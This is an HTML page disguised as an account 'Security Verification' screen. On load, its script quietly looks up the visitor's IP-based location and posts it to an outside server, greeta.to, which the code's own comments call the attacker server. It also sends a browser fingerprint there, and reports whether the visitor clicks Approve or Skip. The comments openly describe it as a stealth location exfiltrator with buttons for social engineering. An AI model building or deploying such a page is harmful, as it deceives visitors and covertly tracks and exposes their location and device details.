<!DOCTYPE html>
<html>
<head>
    <title>Security Verification</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .shield-icon {
            font-size: 64px;
            color: #4CAF50;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4CAF50, #45a049);
            border-radius: 4px;
            transition: width 0.3s ease;
            width: 0%;
        }
        .status {
            color: #555;
            margin: 15px 0;
            font-size: 14px;
        }
        button {
            background: linear-gradient(135deg, #4CAF50, #45a049);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            margin: 10px;
            transition: transform 0.2s;
            min-width: 120px;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
        }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        .hidden {
            display: none;
        }
        .success {
            color: #4CAF50;
            font-weight: 500;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #4CAF50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .debug {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(0,0,0,0.8);
            color: #00ff00;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 10px;
            max-width: 300px;
            max-height: 200px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="shield-icon">üõ°Ô∏è</div>
        <h1>Security Verification</h1>
        <p class="subtitle">Verifying your location for enhanced security. This helps protect your account from unauthorized access.</p>
        
        <div class="progress-bar">
            <div class="progress-fill" id="progressBar"></div>
        </div>
        
        <div class="status" id="status">Initializing security check...</div>
        
        <div id="buttons" class="hidden">
            <button onclick="userApprove()">Approve Verification</button>
            <button onclick="userDeny()" style="background: #f44336;">Skip Verification</button>
        </div>
        
        <div id="success" class="hidden">
            <div class="success">‚úÖ Security verification complete!</div>
            <p style="color: #666; margin-top: 15px;">Your account security has been enhanced.</p>
        </div>
    </div>
    
    <div id="debug" class="debug hidden"></div>

    <script>
        let progressBar = document.getElementById('progressBar');
        let status = document.getElementById('status');
        let buttons = document.getElementById('buttons');
        let success = document.getElementById('success');
        let debug = document.getElementById('debug');
        
        let extractedLocation = null;
        let debugMode = window.location.href.includes('debug=1');
        
        if (debugMode) {
            debug.classList.remove('hidden');
        }

        function log(message, type = 'info') {
            if (debugMode) {
                debug.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}\n`;
                debug.scrollTop = debug.scrollHeight;
            }
            console.log(message);
        }

        function updateProgress(percent, statusText) {
            progressBar.style.width = percent + '%';
            status.innerHTML = statusText;
        }

        function showLoading(text) {
            status.innerHTML = `<span class="loading"></span>${text}`;
        }

        async function extractLocationViaIP() {
            log('[+] Starting IP geolocation extraction...', 'info');
            updateProgress(20, 'Analyzing network configuration...');
            
            // These are the exact services that worked in your test
            const ipServices = [
                'https://ipapi.co/json/',
                'https://api.ipify.org?format=json',
                'https://httpbin.org/ip',
                'https://ipinfo.io/json',
                'https://api.myip.com'
            ];
            
            for (const service of ipServices) {
                try {
                    log(`[+] Trying ${service}...`);
                    updateProgress(40, 'Connecting to verification servers...');
                    
                    const response = await fetch(service);
                    const data = await response.json();
                    
                    log(`[!] Service response: ${JSON.stringify(data)}`);
                    updateProgress(60, 'Processing location data...');
                    
                    // Check if we got location coordinates
                    if (data.latitude && data.longitude) {
                        extractedLocation = {
                            latitude: data.latitude,
                            longitude: data.longitude,
                            city: data.city || 'Unknown',
                            region: data.region || data.region_name || 'Unknown',
                            country: data.country || data.country_name || 'Unknown',
                            ip: data.ip || 'Unknown',
                            isp: data.org || data.isp || 'Unknown',
                            timezone: data.timezone || 'Unknown',
                            method: 'ip_geolocation',
                            service: service,
                            timestamp: new Date().toISOString()
                        };
                        
                        log(`[!] LOCATION EXTRACTED: ${extractedLocation.latitude}, ${extractedLocation.longitude}`);
                        updateProgress(80, 'Location verified successfully...');
                        
                        // Immediately send to attacker server
                        await exfiltrateLocation();
                        return true;
                    }
                    
                    // Even if no coordinates, still send IP data
                    if (data.ip) {
                        extractedLocation = {
                            ip: data.ip,
                            city: data.city || 'Unknown',
                            region: data.region || data.region_name || 'Unknown', 
                            country: data.country || data.country_name || 'Unknown',
                            isp: data.org || data.isp || 'Unknown',
                            method: 'ip_only',
                            service: service,
                            timestamp: new Date().toISOString()
                        };
                        
                        log(`[!] IP DATA EXTRACTED: ${extractedLocation.ip} - ${extractedLocation.city}`);
                        await exfiltrateLocation();
                        return true;
                    }
                    
                } catch (error) {
                    log(`[!] ${service} failed: ${error.message}`);
                    continue;
                }
                
                // Small delay between services
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            log('[!] All IP services failed');
            return false;
        }

        async function exfiltrateLocation() {
            if (!extractedLocation) {
                log('[!] No location data to exfiltrate');
                return;
            }
            
            try {
                log('[+] Sending location data to attacker server...');
                updateProgress(90, 'Finalizing security verification...');
                
                // Send to your server
                const response = await fetch('https://www.greeta.to', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        type: 'location_data',
                        ...extractedLocation,
                        user_agent: navigator.userAgent,
                        referrer: document.referrer,
                        url: window.location.href
                    })
                });
                
                if (response.ok) {
                    log('[!] SUCCESS: Location data sent to attacker server!');
                    updateProgress(100, 'Security verification complete!');
                } else {
                    log(`[!] Server responded with status: ${response.status}`);
                    updateProgress(100, 'Verification complete with warnings...');
                }
                
            } catch (error) {
                log(`[!] Failed to send to server: ${error.message}`);
                
                // Fallback: try GET request with data in URL params
                try {
                    const params = new URLSearchParams(extractedLocation);
                    await fetch(`https://www.greeta.to?${params.toString()}`, {
                        method: 'GET',
                        mode: 'no-cors'
                    });
                    log('[!] Fallback GET request sent');
                } catch (e) {
                    log(`[!] Fallback also failed: ${e.message}`);
                }
                
                updateProgress(100, 'Verification complete!');
            }
        }

        async function executeStealthExtraction() {
            log('[!] STEALTH LOCATION EXTRACTION INITIATED');
            showLoading('Initializing security protocols...');
            
            // Add some realistic delays
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            updateProgress(10, 'Connecting to security servers...');
            await new Promise(resolve => setTimeout(resolve, 800));
            
            // Extract location
            const success = await extractLocationViaIP();
            
            if (success) {
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Show success and buttons for social engineering
                status.classList.add('hidden');
                progressBar.parentElement.classList.add('hidden');
                success.classList.remove('hidden');
                
                // Show buttons after a delay to make it look more legitimate
                setTimeout(() => {
                    buttons.classList.remove('hidden');
                }, 1500);
                
            } else {
                updateProgress(100, 'Verification completed with limited data...');
                setTimeout(() => {
                    buttons.classList.remove('hidden');
                }, 2000);
            }
        }

        function userApprove() {
            log('[+] User clicked Approve');
            buttons.innerHTML = '<div class="success">‚úÖ Thank you for verifying your security settings!</div>';
            
            // Send additional confirmation to server
            if (extractedLocation) {
                fetch('https://www.greeta.to', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'user_approval',
                        action: 'approved',
                        timestamp: new Date().toISOString(),
                        location: extractedLocation
                    })
                }).catch(e => log(`[!] Approval confirmation failed: ${e.message}`));
            }
        }

        function userDeny() {
            log('[+] User clicked Skip/Deny');
            buttons.innerHTML = '<div style="color: #f44336;">‚ö†Ô∏è Security verification skipped. Some features may be limited.</div>';
            
            // Send denial to server
            fetch('https://www.greeta.to', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'user_denial',
                    action: 'denied',
                    timestamp: new Date().toISOString(),
                    partial_data: extractedLocation
                })
            }).catch(e => log(`[!] Denial notification failed: ${e.message}`));
        }

        // Auto-execute immediately on page load
        window.onload = function() {
            log('[!] STEALTH LOCATION EXFILTRATOR LOADED');
            
            // Start extraction immediately
            setTimeout(executeStealthExtraction, 500);
        };

        // Also extract additional browser data
        setTimeout(() => {
            const browserData = {
                type: 'browser_fingerprint',
                user_agent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                screen_resolution: `${screen.width}x${screen.height}`,
                color_depth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezone_offset: new Date().getTimezoneOffset(),
                cookies_enabled: navigator.cookieEnabled,
                referrer: document.referrer,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            // Send browser fingerprint
            fetch('https://www.greeta.to', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(browserData)
            }).catch(e => log(`[!] Browser fingerprint failed: ${e.message}`));
            
        }, 3000);
    </script>
</body>
</html>
